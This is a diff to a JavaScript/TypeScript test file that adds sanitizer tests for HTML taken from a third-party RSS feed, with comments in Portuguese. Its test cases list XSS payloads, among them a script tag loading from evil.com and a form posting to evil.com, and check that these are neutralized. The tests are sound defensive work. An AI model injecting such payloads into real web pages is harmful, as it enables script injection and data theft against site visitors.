@@ -4,6 +4,7 @@ import {
   obterIdsCurtidos,
   alternarCurtidaNoticia,
   limparTexto,
+  formatarHtmlEditorial,
   calcularTempoLeitura,
   obterModoExibicao,
   salvarModoExibicao,
@@ -78,5 +79,56 @@ describe("Módulo de Notícias & Revista (Reconstruído)", () => {
   it("deve limpar ruídos HTML de RSS", () => {
     const limpo = limparTexto("<![CDATA[<p>Notícia com <a href='#'>link</a> &amp; imagem</p>]]>");
     expect(limpo).toBe("Notícia com link & imagem");
+  });
+});
+
+// ── formatarHtmlEditorial ───────────────────────────────────────────────────
+// Este HTML vem de feed RSS de terceiro e é injetado com dangerouslySetInnerHTML.
+// A sanitização acontece por ÚLTIMO, depois das regex de estilo, para que a
+// segurança não dependa de nenhuma dessas regex se comportar bem.
+describe("formatarHtmlEditorial", () => {
+  const casos: Array<[string, string]> = [
+    ["svg com onload", '<svg onload="alert(1)"></svg>'],
+    ["img com onerror", '<img src=x onerror="alert(1)">'],
+    ["iframe sem fechamento", '<iframe src="javascript:alert(1)">'],
+    ["script sem fechamento", '<script src="//evil.com/x.js">'],
+    ["link javascript:", '<a href="javascript:alert(1)">clique</a>'],
+    ["body com onload", '<body onload="alert(1)">texto</body>'],
+    ["details com ontoggle", '<details open ontoggle="alert(1)">x</details>'],
+    ["style com expression", '<style>body{background:url("javascript:alert(1)")}</style>'],
+    ["form com action", '<form action="//evil.com"><input name="t"></form>'],
+  ];
+
+  for (const [nome, payload] of casos) {
+    it(`neutraliza ${nome}`, () => {
+      const saida = formatarHtmlEditorial(payload);
+      expect(saida).not.toMatch(/onload=/i);
+      expect(saida).not.toMatch(/onerror=/i);
+      expect(saida).not.toMatch(/ontoggle=/i);
+      expect(saida).not.toMatch(/javascript:/i);
+      expect(saida).not.toMatch(/<script/i);
+      expect(saida).not.toMatch(/<iframe/i);
+      expect(saida).not.toMatch(/<style/i);
+      expect(saida).not.toMatch(/<form/i);
+    });
+  }
+
+  it("preserva o conteúdo legítimo e aplica as classes de estilo", () => {
+    const saida = formatarHtmlEditorial("<p>Olá <strong>mundo</strong></p>");
+    expect(saida).toContain("mundo");
+    expect(saida).toContain("<strong>");
+    expect(saida).toContain('class="mb-4');
+  });
+
+  it("usa o atributo 'class' e nunca 'className'", () => {
+    const saida = formatarHtmlEditorial("<h2>Título</h2><p>corpo</p>");
+    expect(saida).not.toContain("className");
+    expect(saida).toContain("class=");
+  });
+
+  it("transforma texto puro em parágrafos", () => {
+    const saida = formatarHtmlEditorial("primeiro\n\nsegundo");
+    expect(saida).toContain("primeiro");
+    expect(saida).toContain("segundo");
   });
 });
